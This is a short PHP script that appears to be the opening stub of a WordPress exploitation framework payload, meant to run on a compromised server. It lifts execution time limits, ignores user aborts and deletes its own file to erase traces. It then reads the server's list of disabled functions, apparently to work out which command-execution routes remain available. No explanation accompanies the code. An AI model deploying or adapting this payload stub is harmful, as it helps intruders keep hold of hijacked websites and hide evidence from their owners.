<?php
  @set_time_limit(0);
  @ignore_user_abort(1);
  @ini_set('max_execution_time',0);
  unlink(preg_replace('@\(.*\(.*$@', '', __FILE__));

  $wpxf_disabled = @ini_get('disable_functions');

  if (!empty($wpxf_disabled)) {
    $wpxf_disabled = preg_replace('/[, ]+/', ',', $wpxf_disabled);
    $wpxf_disabled = explode(',', $wpxf_disabled);
    $wpxf_disabled = array_map('trim', $wpxf_disabled);
  }
  else {
    $wpxf_disabled = array();
  }
?>
